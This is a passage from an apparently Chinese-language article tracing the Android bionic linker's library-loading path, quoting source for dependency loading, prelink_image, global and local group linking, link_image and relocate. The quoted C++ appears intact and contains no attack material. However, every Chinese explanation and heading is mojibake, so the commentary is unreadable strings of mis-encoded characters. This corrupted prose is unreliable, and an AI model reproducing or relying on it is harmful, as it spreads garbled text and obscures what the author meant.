DT_RUNPATH, DT_SONAME, and DT_FLAGS_1.// Note that these field values are temporary and are// going to be overwritten on soinfo::prelink_image// with values from PT_LOAD segments.const ElfReader&amp; elf_reader = task->get_elf_reader();for (const ElfW(Dyn)* d = elf_reader.dynamic(); d->d_tag != DT_NULL; ++d) &#123; if (d->d_tag == DT_RUNPATH) &#123; si->set_dt_runpath(elf_reader.get_string(d->d_un.d_val)); &#125; if (d->d_tag == DT_SONAME) &#123; si->set_soname(elf_reader.get_string(d->d_un.d_val)); &#125; // We need to identify a DF_1_GLOBAL library early so we can link it to namespaces. if (d->d_tag == DT_FLAGS_1) &#123; si->set_dt_flags_1(d->d_un.d_val); &#125;&#125;ä¹‹åæ‰¾åˆ°å¾…åŠ è½½çš„ so çš„ä¾èµ–åº“ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæ¨¡æ¿å‡½æ•° for_each_dt_needed , æ‰¾åˆ° .dynamic ä¸­æ‰€æœ‰å¸¦æœ‰ DT_NEEDED æ ‡å¿—çš„å­—ç¬¦ä¸²ï¼Œè¿™äº›å­—ç¬¦ä¸²çš„åç§°å°±æ˜¯è¿™ä¸ª so æ‰€éœ€è¦çš„ä¾èµ–åº“ï¼Œç„¶åå°†å®ƒä»¬æ·»åŠ åˆ° load_tasks é˜Ÿåˆ—ä¸­ //android-platform\\bionic\\linker\\linker.cppfor_each_dt_needed(task->get_elf_reader(), [&amp;](const char* name) &#123; LD_LOG(kLogDlopen, \"load_library(ns=%s, task=%s): Adding DT_NEEDED task: %s\", ns->get_name(), task->get_name(), name); load_tasks->push_back(LoadTask::create(name, si, ns, task->get_readers_map()));&#125;);//android-platform\\bionic\\linker\\linker_soinfo.htemplate&lt;typename F>void for_each_dt_needed(const soinfo* si, F action) &#123; for (const ElfW(Dyn)* d = si->dynamic; d->d_tag != DT_NULL; ++d) &#123; if (d->d_tag == DT_NEEDED) &#123; action(fix_dt_needed(si->get_string(d->d_un.d_val), si->get_realpath())); &#125; &#125;&#125;# ä¹±åºåŠ è½½åº“ ä¹±åºåŠ è½½çš„åŸå› å¦‚ä¸‹ï¼Œçœ‹ä¸Šå»æ˜¯ä¸ºäº†æŠµå¾¡æ”»å‡» ld.so(1) on ELF platforms now loads libraries in a random order for greater resistance to attacks // Step 2: Load libraries in random order (see b/24047022)LoadTaskList load_list;for (auto&amp;&amp; task : load_tasks) &#123; soinfo* si = task->get_soinfo(); auto pred = [&amp;](const LoadTask* t) &#123; return t->get_soinfo() == si; &#125;; if (!si->is_linked() &amp;&amp; std::find_if(load_list.begin(), load_list.end(), pred) == load_list.end() ) &#123; load_list.push_back(task); &#125;&#125;bool reserved_address_recursive = false;if (extinfo) &#123; reserved_address_recursive = extinfo->flags &amp; ANDROID_DLEXT_RESERVED_ADDRESS_RECURSIVE;&#125;if (!reserved_address_recursive) &#123; // Shuffle the load order in the normal case, but not if we are loading all // the libraries to a reserved address range. shuffle(&amp;load_list);&#125;// Set up address space parameters.address_space_params extinfo_params, default_params;size_t relro_fd_offset = 0;if (extinfo) &#123; if (extinfo->flags &amp; ANDROID_DLEXT_RESERVED_ADDRESS) &#123; extinfo_params.start_addr = extinfo->reserved_addr; extinfo_params.reserved_size = extinfo->reserved_size; extinfo_params.must_use_address = true; &#125; else if (extinfo->flags &amp; ANDROID_DLEXT_RESERVED_ADDRESS_HINT) &#123; extinfo_params.start_addr = extinfo->reserved_addr; extinfo_params.reserved_size = extinfo->reserved_size; &#125;&#125;for (auto&amp;&amp; task : load_list) &#123; address_space_params* address_space = (reserved_address_recursive || !task->is_dt_needed()) ? &amp;extinfo_params : &amp;default_params; // åŠ è½½æ‰€æœ‰çš„åº“ï¼ŒåŒ…æ‹¬å¾…åŠ è½½çš„ so if (!task->load(address_space)) &#123; return false; &#125;&#125;load å‡½æ•°å°±æ˜¯å°† ELF çš„ç›¸å…³ç»“æ„çš„å€¼èµ‹å€¼ç»™ si_ , å…¶ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¯”è¾ƒé‡è¦çš„å­—æ®µæœ‰ phdr_count , loaded_phdr bool load(address_space_params* address_space) &#123; ElfReader&amp; elf_reader = get_elf_reader(); if (!elf_reader.Load(address_space)) &#123; return false; &#125; si_->base = elf_reader.load_start(); si_->size = elf_reader.load_size(); si_->set_mapped_by_caller(elf_reader.is_mapped_by_caller()); si_->load_bias = elf_reader.load_bias(); si_->phnum = elf_reader.phdr_count(); si_->phdr = elf_reader.loaded_phdr(); si_->set_gap_start(elf_reader.gap_start()); si_->set_gap_size(elf_reader.gap_size()); return true;&#125;# é¢„é“¾æ¥è§£ææ‰€æœ‰ä¾èµ–åº“ // Step 3: pre-link all DT_NEEDED libraries in breadth first order. for (auto&amp;&amp; task : load_tasks) &#123; soinfo* si = task->get_soinfo(); if (!si->is_linked() &amp;&amp; !si->prelink_image()) &#123; return false; &#125; register_soinfo_tls(si); &#125;è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°è°ƒç”¨äº† prelink_image æ¥é¢„é“¾æ¥ä¾èµ–åº“ï¼Œä¸»è¦æ˜¯éå† .dynamic èŠ‚ï¼Œæ¥æå–å¿…è¦çš„ä¿¡æ¯ä¾‹å¦‚ strtab_ , symtab_ , plt_rela_ , init_array_ ç­‰ç­‰å„ç§å¿…è¦çš„ä¿¡æ¯ bool soinfo::prelink_image() &#123; if (flags_ &amp; FLAG_PRELINKED) return true; /* Extract dynamic section */ ElfW(Word) dynamic_flags = 0; // æå–åŠ¨æ€èŠ‚ï¼ˆdynamic sectionï¼‰ phdr_table_get_dynamic_section(phdr, phnum, load_bias, &amp;dynamic, &amp;dynamic_flags); /* We can't log anything until the linker is relocated */ bool relocating_linker = (flags_ &amp; FLAG_LINKER) != 0; if (!relocating_linker) &#123; INFO(\"[ Linking \\\"%s\\\" ]\", get_realpath()); DEBUG(\"si->base = %p si->flags = 0x%08x\", reinterpret_cast&lt;void*>(base), flags_); &#125; if (dynamic == nullptr) &#123; if (!relocating_linker) &#123; DL_ERR(\"missing PT_DYNAMIC in \\\"%s\\\"\", get_realpath()); &#125; return false; &#125; else &#123; if (!relocating_linker) &#123; DEBUG(\"dynamic = %p\", dynamic); &#125; &#125;#if defined(__arm__) (void) phdr_table_get_arm_exidx(phdr, phnum, load_bias, &amp;ARM_exidx, &amp;ARM_exidx_count);#endif TlsSegment tls_segment; if (__bionic_get_tls_segment(phdr, phnum, load_bias, &amp;tls_segment)) &#123; if (!__bionic_check_tls_alignment(&amp;tls_segment.alignment)) &#123; if (!relocating_linker) &#123; DL_ERR(\"TLS segment alignment in \\\"%s\\\" is not a power of 2: %zu\", get_realpath(), tls_segment.alignment); &#125; return false; &#125; tls_ = std::make_unique&lt;soinfo_tls>(); tls_->segment = tls_segment; &#125; // Extract useful information from dynamic section. // Note that: \"Except for the DT_NULL element at the end of the array, // and the relative order of DT_NEEDED elements, entries may appear in any order.\" // // source: http://www.sco.com/developers/gabi/1998-04-29/ch5.dynamic.html uint32_t needed_count = 0; // å¾ªç¯éå†æ¯ä¸ªåŠ¨æ€èŠ‚ï¼Œå¹¶æ ¹æ® d_tag ä¸ºå¯¹åº”èŠ‚åšç›¸åº”çš„å¤„ç† for (ElfW(Dyn)* d = dynamic; d->d_tag != DT_NULL; ++d) &#123; DEBUG(\"d = %p, d[0](tag) = %p d[1](val) = %p\", d, reinterpret_cast&lt;void*>(d->d_tag), reinterpret_cast&lt;void*>(d->d_un.d_val)); switch (d->d_tag) &#123; case DT_SONAME: // this is parsed after we have strtab initialized (see below). break; case DT_HASH: nbucket_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[0]; nchain_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[1]; bucket_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr + 8); chain_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr + 8 + nbucket_ * 4); break; case DT_GNU_HASH: gnu_nbucket_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[0]; // skip symndx gnu_maskwords_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[2]; gnu_shift2_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[3]; gnu_bloom_filter_ = reinterpret_cast&lt;ElfW(Addr)*>(load_bias + d->d_un.d_ptr + 16); gnu_bucket_ = reinterpret_cast&lt;uint32_t*>(gnu_bloom_filter_ + gnu_maskwords_); // amend chain for symndx = header[1] gnu_chain_ = gnu_bucket_ + gnu_nbucket_ - reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[1]; if (!powerof2(gnu_maskwords_)) &#123; DL_ERR(\"invalid maskwords for gnu_hash = 0x%x, in \\\"%s\\\" expecting power to two\", gnu_maskwords_, get_realpath()); return false; &#125; --gnu_maskwords_; flags_ |= FLAG_GNU_HASH; break; case DT_STRTAB: strtab_ = reinterpret_cast&lt;const char*>(load_bias + d->d_un.d_ptr); break; case DT_STRSZ: strtab_size_ = d->d_un.d_val; break; case DT_SYMTAB: symtab_ = reinterpret_cast&lt;ElfW(Sym)*>(load_bias + d->d_un.d_ptr); break; case DT_SYMENT: if (d->d_un.d_val != sizeof(ElfW(Sym))) &#123; DL_ERR(\"invalid DT_SYMENT: %zd in \\\"%s\\\"\", static_cast&lt;size_t>(d->d_un.d_val), get_realpath()); return false; &#125; break; case DT_PLTREL:#if defined(USE_RELA) if (d->d_un.d_val != DT_RELA) &#123; DL_ERR(\"unsupported DT_PLTREL in \\\"%s\\\"; expected DT_RELA\", get_realpath()); return false; &#125;#else if (d->d_un.d_val != DT_REL) &#123; DL_ERR(\"unsupported DT_PLTREL in \\\"%s\\\"; expected DT_REL\", get_realpath()); return false; &#125;#endif break; case DT_JMPREL:#if defined(USE_RELA) plt_rela_ = reinterpret_cast&lt;ElfW(Rela)*>(load_bias + d->d_un.d_ptr);#else plt_rel_ = reinterpret_cast&lt;ElfW(Rel)*>(load_bias + d->d_un.d_ptr);#endif break; case DT_PLTRELSZ:#if defined(USE_RELA) plt_rela_count_ = d->d_un.d_val / sizeof(ElfW(Rela));#else plt_rel_count_ = d->d_un.d_val / sizeof(ElfW(Rel));#endif break; case DT_PLTGOT: // Ignored (because RTLD_LAZY is not supported). break; case DT_DEBUG: // Set the DT_DEBUG entry to the address of _r_debug for GDB // if the dynamic table is writable if ((dynamic_flags &amp; PF_W) != 0) &#123; d->d_un.d_val = reinterpret_cast&lt;uintptr_t>(&amp;_r_debug); &#125; break;#if defined(USE_RELA) case DT_RELA: rela_ = reinterpret_cast&lt;ElfW(Rela)*>(load_bias + d->d_un.d_ptr); break; case DT_RELASZ: rela_count_ = d->d_un.d_val / sizeof(ElfW(Rela)); break; case DT_ANDROID_RELA: android_relocs_ = reinterpret_cast&lt;uint8_t*>(load_bias + d->d_un.d_ptr); break; case DT_ANDROID_RELASZ: android_relocs_size_ = d->d_un.d_val; break; case DT_ANDROID_REL: DL_ERR(\"unsupported DT_ANDROID_REL in \\\"%s\\\"\", get_realpath()); return false; case DT_ANDROID_RELSZ: DL_ERR(\"unsupported DT_ANDROID_RELSZ in \\\"%s\\\"\", get_realpath()); return false; case DT_RELAENT: if (d->d_un.d_val != sizeof(ElfW(Rela))) &#123; DL_ERR(\"invalid DT_RELAENT: %zd\", static_cast&lt;size_t>(d->d_un.d_val)); return false; &#125; break; // Ignored (see DT_RELCOUNT comments for details). case DT_RELACOUNT: break; case DT_REL: DL_ERR(\"unsupported DT_REL in \\\"%s\\\"\", get_realpath()); return false; case DT_RELSZ: DL_ERR(\"unsupported DT_RELSZ in \\\"%s\\\"\", get_realpath()); return false;#else case DT_REL: rel_ = reinterpret_cast&lt;ElfW(Rel)*>(load_bias + d->d_un.d_ptr); break; case DT_RELSZ: rel_count_ = d->d_un.d_val / sizeof(ElfW(Rel)); break; case DT_RELENT: if (d->d_un.d_val != sizeof(ElfW(Rel))) &#123; DL_ERR(\"invalid DT_RELENT: %zd\", static_cast&lt;size_t>(d->d_un.d_val)); return false; &#125; break; case DT_ANDROID_REL: android_relocs_ = reinterpret_cast&lt;uint8_t*>(load_bias + d->d_un.d_ptr); break; case DT_ANDROID_RELSZ: android_relocs_size_ = d->d_un.d_val; break; case DT_ANDROID_RELA: DL_ERR(\"unsupported DT_ANDROID_RELA in \\\"%s\\\"\", get_realpath()); return false; case DT_ANDROID_RELASZ: DL_ERR(\"unsupported DT_ANDROID_RELASZ in \\\"%s\\\"\", get_realpath()); return false; // \"Indicates that all RELATIVE relocations have been concatenated together, // and specifies the RELATIVE relocation count.\" // // TODO: Spec also mentions that this can be used to optimize relocation process; // Not currently used by bionic linker - ignored. case DT_RELCOUNT: break; case DT_RELA: DL_ERR(\"unsupported DT_RELA in \\\"%s\\\"\", get_realpath()); return false; case DT_RELASZ: DL_ERR(\"unsupported DT_RELASZ in \\\"%s\\\"\", get_realpath()); return false;#endif case DT_RELR: case DT_ANDROID_RELR: relr_ = reinterpret_cast&lt;ElfW(Relr)*>(load_bias + d->d_un.d_ptr); break; case DT_RELRSZ: case DT_ANDROID_RELRSZ: relr_count_ = d->d_un.d_val / sizeof(ElfW(Relr)); break; case DT_RELRENT: case DT_ANDROID_RELRENT: if (d->d_un.d_val != sizeof(ElfW(Relr))) &#123; DL_ERR(\"invalid DT_RELRENT: %zd\", static_cast&lt;size_t>(d->d_un.d_val)); return false; &#125; break; // Ignored (see DT_RELCOUNT comments for details). // There is no DT_RELRCOUNT specifically because it would only be ignored. case DT_ANDROID_RELRCOUNT: break; case DT_INIT: init_func_ = reinterpret_cast&lt;linker_ctor_function_t>(load_bias + d->d_un.d_ptr); DEBUG(\"%s constructors (DT_INIT) found at %p\", get_realpath(), init_func_); break; case DT_FINI: fini_func_ = reinterpret_cast&lt;linker_dtor_function_t>(load_bias + d->d_un.d_ptr); DEBUG(\"%s destructors (DT_FINI) found at %p\", get_realpath(), fini_func_); break; case DT_INIT_ARRAY: init_array_ = reinterpret_cast&lt;linker_ctor_function_t*>(load_bias + d->d_un.d_ptr); DEBUG(\"%s constructors (DT_INIT_ARRAY) found at %p\", get_realpath(), init_array_); break; case DT_INIT_ARRAYSZ: init_array_count_ = static_cast&lt;uint32_t>(d->d_un.d_val) / sizeof(ElfW(Addr)); break; case DT_FINI_ARRAY: fini_array_ = reinterpret_cast&lt;linker_dtor_function_t*>(load_bias + d->d_un.d_ptr); DEBUG(\"%s destructors (DT_FINI_ARRAY) found at %p\", get_realpath(), fini_array_); break; case DT_FINI_ARRAYSZ: fini_array_count_ = static_cast&lt;uint32_t>(d->d_un.d_val) / sizeof(ElfW(Addr)); break; case DT_PREINIT_ARRAY: preinit_array_ = reinterpret_cast&lt;linker_ctor_function_t*>(load_bias + d->d_un.d_ptr); DEBUG(\"%s constructors (DT_PREINIT_ARRAY) found at %p\", get_realpath(), preinit_array_); break; case DT_PREINIT_ARRAYSZ: preinit_array_count_ = static_cast&lt;uint32_t>(d->d_un.d_val) / sizeof(ElfW(Addr)); break; case DT_TEXTREL:#if defined(__LP64__) DL_ERR(\"\\\"%s\\\" has text relocations\", get_realpath()); return false;#else has_text_relocations = true; break;#endif case DT_SYMBOLIC: has_DT_SYMBOLIC = true; break; case DT_NEEDED: ++needed_count; break; case DT_FLAGS: if (d->d_un.d_val &amp; DF_TEXTREL) &#123;#if defined(__LP64__) DL_ERR(\"\\\"%s\\\" has text relocations\", get_realpath()); return false;#else has_text_relocations = true;#endif &#125; if (d->d_un.d_val &amp; DF_SYMBOLIC) &#123; has_DT_SYMBOLIC = true; &#125; break; case DT_FLAGS_1: set_dt_flags_1(d->d_un.d_val); if ((d->d_un.d_val &amp; ~SUPPORTED_DT_FLAGS_1) != 0) &#123; DL_WARN(\"Warning: \\\"%s\\\" has unsupported flags DT_FLAGS_1=%p \" \"(ignoring unsupported flags)\", get_realpath(), reinterpret_cast&lt;void*>(d->d_un.d_val)); &#125; break; // Ignored: \"Its use has been superseded by the DF_BIND_NOW flag\" case DT_BIND_NOW: break; case DT_VERSYM: versym_ = reinterpret_cast&lt;ElfW(Versym)*>(load_bias + d->d_un.d_ptr); break; case DT_VERDEF: verdef_ptr_ = load_bias + d->d_un.d_ptr; break; case DT_VERDEFNUM: verdef_cnt_ = d->d_un.d_val; break; case DT_VERNEED: verneed_ptr_ = load_bias + d->d_un.d_ptr; break; case DT_VERNEEDNUM: verneed_cnt_ = d->d_un.d_val; break; case DT_RUNPATH: // this is parsed after we have strtab initialized (see below). break; case DT_TLSDESC_GOT: case DT_TLSDESC_PLT: // These DT entries are used for lazy TLSDESC relocations. Bionic // resolves everything eagerly, so these can be ignored. break;#if defined(__aarch64__) case DT_AARCH64_BTI_PLT: case DT_AARCH64_PAC_PLT: case DT_AARCH64_VARIANT_PCS: // Ignored: AArch64 processor-specific dynamic array tags. break;#endif default: if (!relocating_linker) &#123; const char* tag_name; if (d->d_tag == DT_RPATH) &#123; tag_name = \"DT_RPATH\"; &#125; else if (d->d_tag == DT_ENCODING) &#123; tag_name = \"DT_ENCODING\"; &#125; else if (d->d_tag >= DT_LOOS &amp;&amp; d->d_tag &lt;= DT_HIOS) &#123; tag_name = \"unknown OS-specific\"; &#125; else if (d->d_tag >= DT_LOPROC &amp;&amp; d->d_tag &lt;= DT_HIPROC) &#123; tag_name = \"unknown processor-specific\"; &#125; else &#123; tag_name = \"unknown\"; &#125; DL_WARN(\"Warning: \\\"%s\\\" unused DT entry: %s (type %p arg %p) (ignoring)\", get_realpath(), tag_name, reinterpret_cast&lt;void*>(d->d_tag), reinterpret_cast&lt;void*>(d->d_un.d_val)); &#125; break; &#125; &#125; DEBUG(\"si->base = %p, si->strtab = %p, si->symtab = %p\", reinterpret_cast&lt;void*>(base), strtab_, symtab_); // Validity checks. if (relocating_linker &amp;&amp; needed_count != 0) &#123; DL_ERR(\"linker cannot have DT_NEEDED dependencies on other libraries\"); return false; &#125; if (nbucket_ == 0 &amp;&amp; gnu_nbucket_ == 0) &#123; DL_ERR(\"empty/missing DT_HASH/DT_GNU_HASH in \\\"%s\\\" \" \"(new hash type from the future?)\", get_realpath()); return false; &#125; if (strtab_ == nullptr) &#123; DL_ERR(\"empty/missing DT_STRTAB in \\\"%s\\\"\", get_realpath()); return false; &#125; if (symtab_ == nullptr) &#123; DL_ERR(\"empty/missing DT_SYMTAB in \\\"%s\\\"\", get_realpath()); return false; &#125; // Second pass - parse entries relying on strtab. Skip this while relocating the linker so as to // avoid doing heap allocations until later in the linker's initialization. if (!relocating_linker) &#123; for (ElfW(Dyn)* d = dynamic; d->d_tag != DT_NULL; ++d) &#123; switch (d->d_tag) &#123; case DT_SONAME: set_soname(get_string(d->d_un.d_val)); break; case DT_RUNPATH: set_dt_runpath(get_string(d->d_un.d_val)); break; &#125; &#125; &#125; // Before M release, linker was using basename in place of soname. In the case when DT_SONAME is // absent some apps stop working because they can't find DT_NEEDED library by soname. This // workaround should keep them working. (Applies only for apps targeting sdk version &lt; M.) Make // an exception for the main executable, which does not need to have DT_SONAME. The linker has an // DT_SONAME but the soname_ field is initialized later on. if (soname_.empty() &amp;&amp; this != solist_get_somain() &amp;&amp; !relocating_linker &amp;&amp; get_application_target_sdk_version() &lt; 23) &#123; soname_ = basename(realpath_.c_str()); DL_WARN_documented_change(23, \"missing-soname-enforced-for-api-level-23\", \"\\\"%s\\\" has no DT_SONAME (will use %s instead)\", get_realpath(), soname_.c_str()); // Don't call add_dlwarning because a missing DT_SONAME isn't important enough to show in the UI &#125; // Validate each library's verdef section once, so we don't have to validate // it each time we look up a symbol with a version. if (!validate_verdef_section(this)) return false; flags_ |= FLAG_PRELINKED; return true;&#125;# æ„é€ å…¨å±€ç»„ è¿™ä¸€æ­¥ä¸ºé¢„é“¾æ¥çš„ä¾èµ–åº“è®¾ç½® DF_1_GLOBAL å…¨å±€æ ‡å¿—ï¼Œæ¥æ ‡è®°è¿™ä¸ªåº“åœ¨å…¨å±€ç»„ä¸­ // Step 4: Construct the global group. DF_1_GLOBAL bit is force set for LD_PRELOADed libs because// they must be added to the global group. Note: The DF_1_GLOBAL bit for a library is normally set// in step 3.if (ld_preloads != nullptr) &#123; for (auto&amp;&amp; si : *ld_preloads) &#123; si->set_dt_flags_1(si->get_dt_flags_1() | DF_1_GLOBAL); &#125;&#125;# æ”¶é›† local_groups çš„æ ¹èŠ‚ç‚¹ çœ‹æ³¨é‡Šæ„Ÿè§‰æŒºæŠ½è±¡çš„ï¼Œæ„Ÿè§‰æ˜¯ä¸ºäº†ä¿è¯å¯ä»¥é“¾æ¥åˆ°åˆ«çš„ namespace é‡Œé¢çš„ä¾èµ–åº“ // Step 5: Collect roots of local_groups.// Whenever needed_by->si link crosses a namespace boundary it forms its own local_group.// Here we collect new roots to link them separately later on. Note that we need to avoid// collecting duplicates. Also the order is important. They need to be linked in the same// BFS order we link individual libraries.std::vector&lt;soinfo*> local_group_roots;if (start_with != nullptr &amp;&amp; add_as_children) &#123; local_group_roots.push_back(start_with);&#125; else &#123; CHECK(soinfos_count == 1); local_group_roots.push_back(soinfos[0]);&#125;for (auto&amp;&amp; task : load_tasks) &#123; soinfo* si = task->get_soinfo(); soinfo* needed_by = task->get_needed_by(); bool is_dt_needed = needed_by != nullptr &amp;&amp; (needed_by != start_with || add_as_children); android_namespace_t* needed_by_ns = is_dt_needed ? needed_by->get_primary_namespace() : ns; if (!si->is_linked() &amp;&amp; si->get_primary_namespace() != needed_by_ns) &#123; auto it = std::find(local_group_roots.begin(), local_group_roots.end(), si); LD_LOG(kLogDlopen, \"Crossing namespace boundary (si=%s@%p, si_ns=%s@%p, needed_by=%s@%p, ns=%s@%p, needed_by_ns=%s@%p) adding to local_group_roots: %s\", si->get_realpath(), si, si->get_primary_namespace()->get_name(), si->get_primary_namespace(), needed_by == nullptr ? \"(nullptr)\" : needed_by->get_realpath(), needed_by, ns->get_name(), ns, needed_by_ns->get_name(), needed_by_ns, it == local_group_roots.end() ? \"yes\" : \"no\"); if (it == local_group_roots.end()) &#123; local_group_roots.push_back(si); &#125; &#125;&#125;# é“¾æ¥æ‰€æœ‰çš„ local groups // Step 6: Link all local groupsfor (auto root : local_group_roots) &#123; soinfo_list_t local_group; android_namespace_t* local_group_ns = root->get_primary_namespace(); walk_dependencies_tree(root, [&amp;] (soinfo* si) &#123; if (local_group_ns->is_accessible(si)) &#123; local_group.push_back(si); return kWalkContinue; &#125; else &#123; return kWalkSkip; &#125; &#125;); // è·å–å…¨å±€ç»„åŒ…å«çš„ soinfoï¼Œå› ä¸ºé¢„åŠ è½½åº“æ˜¯ä¸€èµ·åŠ è½½çš„è·Ÿ local_group_ns æ˜¯åŒä¸€ä¸ªå‘½åç©ºé—´ // æ‰€æœ‰è¿™é‡Œçš„å…¨å±€ç»„å·²ç»åŒ…å«äº†é¢„åŠ è½½åº“ soinfo_list_t global_group = local_group_ns->get_global_group(); // å°†æœ¬åœ°ç»„å’Œå…¨å±€ç»„éƒ½æ·»åŠ åˆ° lookup_list ä¸­ SymbolLookupList lookup_list(global_group, local_group); soinfo* local_group_root = local_group.front(); bool linked = local_group.visit([&amp;](soinfo* si) &#123; // Even though local group may contain accessible soinfos from other namespaces // we should avoid linking them (because if they are not linked -> they // are in the local_group_roots and will be linked later). if (!si->is_linked() &amp;&amp; si->get_primary_namespace() == local_group_ns) &#123; const android_dlextinfo* link_extinfo = nullptr; if (si == soinfos[0] || reserved_address_recursive) &#123; // Only forward extinfo for the first library unless the recursive // flag is set. link_extinfo = extinfo; &#125; if (__libc_shared_globals()->load_hook) &#123; __libc_shared_globals()->load_hook(si->load_bias, si->phdr, si->phnum); &#125; lookup_list.set_dt_symbolic_lib(si->has_DT_SYMBOLIC ? si : nullptr); // è°ƒç”¨ link_image å¼€å§‹è¿›è¡Œä¾èµ–åº“çš„åŠ¨æ€é“¾æ¥ï¼Œé‡å®šä½ç­‰å·¥ä½œ if (!si->link_image(lookup_list, local_group_root, link_extinfo, &amp;relro_fd_offset) || !get_cfi_shadow()->AfterLoad(si, solist_get_head())) &#123; return false; &#125; &#125; return true; &#125;); if (!linked) &#123; return false; &#125;&#125;å½“æŠŠæ‰€æœ‰çš„æœ¬åœ°ç»„å’Œå…¨å±€ç»„åŠ å…¥åˆ° lookup_list ä¸­åï¼Œå°±å¼€å§‹è°ƒç”¨ si-&gt;link_image æ¥å¯¹è¿™äº›åº“è¿›è¡Œé“¾æ¥çš„æ“ä½œ bool soinfo::link_image(const SymbolLookupList&amp; lookup_list, soinfo* local_group_root, const android_dlextinfo* extinfo, size_t* relro_fd_offset) &#123; if (is_image_linked()) &#123; // already linked. return true; &#125; if (g_is_ldd &amp;&amp; !is_main_executable()) &#123; async_safe_format_fd(STDOUT_FILENO, \"\\t%s => %s (%p)\\n\", get_soname(), get_realpath(), reinterpret_cast&lt;void*>(base)); &#125; local_group_root_ = local_group_root; if (local_group_root_ == nullptr) &#123; local_group_root_ = this; &#125; if ((flags_ &amp; FLAG_LINKER) == 0 &amp;&amp; local_group_root_ == this) &#123; target_sdk_version_ = get_application_target_sdk_version(); &#125;... // è¿›è¡Œç¬¦å·çš„é‡å®šä½ if (!relocate(lookup_list)) &#123; return false; &#125; DEBUG(\"[ finished linking %s ]\", get_realpath());...&#125;åœ¨ soinfo::link_image ä¸­è°ƒç”¨äº† relocate å»è¿›è¡Œç¬¦å·çš„é‡å®šä½ //android-platform\\bionic\\linker\\linker_relocate.cppbool soinfo::relocate(const SymbolLookupList&amp; lookup_list) &#123; VersionTracker version_tracker; if (!version_tracker.init(this)) &#123; return false; &#125; Relocator relocator(version_tracker, lookup_list); relocator.si = this; //`.strtab` èŠ‚ä¿å­˜çš„æ˜¯ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼Œè¡¨ä¸­çš„å†…å®¹ä¼šè¢« `.symtab` çš„ `ElfN_Sym` ç»“æ„ä¸­çš„ `st_name` å¼•ç”¨ relocator.si_strtab = strtab_; relocator.si_strtab_size = has_min_version(1) ? strtab_size_ : SIZE_MAX; //`.symtab` èŠ‚æ˜¯ä¸€ä¸ª `ElfN_Sym` çš„æ•°ç»„ï¼Œä¿å­˜äº†ç¬¦å·ä¿¡æ¯ relocator.si_symtab = symtab_; relocator.tlsdesc_args = &amp;tlsdesc_args_; relocator.tls_tp_base = __libc_shared_globals()->static_tls_layout.offset_thread_pointer(); ////android_relocs_åœ¨ prelink_image () ä¸­è®¾ç½®ï¼ŒåŠ¨æ€èŠ‚æœ‰ DT_ANDROID_REL æ‰ä¼šè®¾ç½® if (android_relocs_ != nullptr) &#123; // check signature if (android_relocs_size_ > 3 &amp;&amp; android_relocs_[0] == 'A' &amp;&amp; android_relocs_[1] == 'P' &amp;&amp; android_relocs_[2] == 'S' &amp;&amp; android_relocs_[3] == '2') &#123; DEBUG(\"[ android relocating %s ]\", get_realpath()); const uint8_t* packed_relocs = android_relocs_ + 4; const size_t packed_relocs_size = android_relocs_size_ - 4; if (!packed_relocate&lt;RelocMode::Typical>(relocator, sleb128_decoder(packed_relocs, packed_relocs_size))) &#123; return false; &#125; &#125; else &#123; DL_ERR(\"bad android relocation header.\"); return false; &#125; &#125; if (relr_ != nullptr) &#123; DEBUG(\"[ relocating %s relr ]\", get_realpath()); if (!relocate_relr()) &#123; return false; &#125; &#125;#if defined(USE_RELA) if (rela_ != nullptr) &#123; DEBUG(\"[ relocating %s rela ]\", get_realpath()); if (!plain_relocate&lt;RelocMode::Typical>(relocator, rela_, rela_count_)) &#123; return false; &#125; &#125; if (plt_rela_ != nullptr) &#123; DEBUG(\"[ relocating %s plt rela ]\", get_realpath()); if (!plain_relocate&lt;RelocMode::JumpTable>(relocator, plt_rela_, plt_rela_count_)) &#123; return false; &#125; &#125;#else if (rel_ != nullptr) &#123; DEBUG(\"[ relocating %s rel ]\", get_realpath()); if (!plain_relocate&lt;RelocMode::Typical>(relocator, rel_, rel_count_)) &#123; return false; &#125; &#125; if (plt_rel_ != nullptr) &#123; DEBUG(\"[ relocating %s plt rel ]\", get_realpath()); if (!plain_relocate&lt;RelocMode::JumpTable>(relocator, plt_rel_, plt_rel_count_)) &#123; return false; &#125; &#125;#endif // Once the tlsdesc_args_ vector's size is finalized, we can write the addresses of its elements // into the TLSDESC relocations.#if defined(__aarch64__) // Bionic currently only implements TLSDESC for arm64. for (const std::pair&lt;TlsDescriptor*, size_t>&amp; pair : relocator.deferred_tlsdesc_relocs) &#123; TlsDescriptor* desc = pair.first; desc->func = tlsdesc_resolver_dynamic; desc->arg = reinterpret_cast&lt;size_t>(&amp;tlsdesc_args_[pair.second]); &#125;#endif return true;&#125;éšåä¾æ¬¡è°ƒç”¨äº† plain_relocate-&gt;plain_relocate_impl-&gt;process_relocation template &lt;RelocMode OptMode, typename ...Args>static bool plain_relocate(Relocator&amp; relocator, Args ...args) &#123; return needs_slow_relocate_loop(relocator) ? plain_relocate_impl&lt;RelocMode::General>(relocator, args...) : plain_relocate_impl&lt;OptMode>(relocator, args...);&#125;template &lt;RelocMode Mode>__attribute__((noinline))static bool plain_relocate_impl(Relocator&amp; relocator, rel_t* rels, size_t rel_count) &#123; for (size_t i = 0; i &lt; rel_count; ++i) &#123; if (!process_relocation&lt;Mode>(relocator, rels[i])) &#123; return false; &#125; &#125; return true;&#125;template &lt;RelocMode Mode>__attribute__((always_inline))static inline bool process_relocation(Relocator&amp; relocator, const rel_t&amp; reloc) &#123; return Mode == RelocMode::General ? process_relocation_general(relocator, reloc) : process_relocation_impl&lt;Mode>(relocator, reloc);&#125;æœ€ç»ˆåœ¨ process_relocation_impl å®ç°äº†ç¬¦å·çš„é‡å®šå‘å¹¶è°ƒç”¨ lookup_symbol 